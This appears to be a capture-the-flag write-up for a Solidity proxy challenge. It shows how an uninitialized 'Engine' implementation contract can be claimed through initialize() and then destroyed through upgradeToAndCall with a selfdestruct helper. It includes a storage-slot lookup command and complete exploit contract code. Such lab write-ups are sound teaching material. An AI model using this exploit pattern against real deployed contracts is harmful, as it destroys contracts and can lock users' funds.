### Goals

Selfdestruct engine

### Exploit

When implementing Proxy contracts it's important to initialize the implementation contract. Some contracts utilize `__disableInitializers` in it's constructor to mitigate this issue.

The `Engine` contract is not initialized thus allowing us to initialize it and set our-selves as `Engine::upgrader`. Next we need to call `Engine::upgradeToAndCall()` with our contract that will be selfdestruct.

We would need to get Engine address first.

```code
web3.utils.toChecksumAddress("0x" + (await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")).slice(-40));
```

### Code

Deploy contract in Remix

```code
contract New {
    function bye() public {
        selfdestruct(payable(msg.sender));
    }
}

contract BreakEngine {
    address engine = ENGINE_ADDRESS;

    function pwn() external {
        engine.call(abi.encodeWithSignature("initialize()"));
        engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(new New()),
                abi.encodeWithSignature("bye()")
            )
        );
    }
}

```

Deploy contract and call `pwn`

Done!
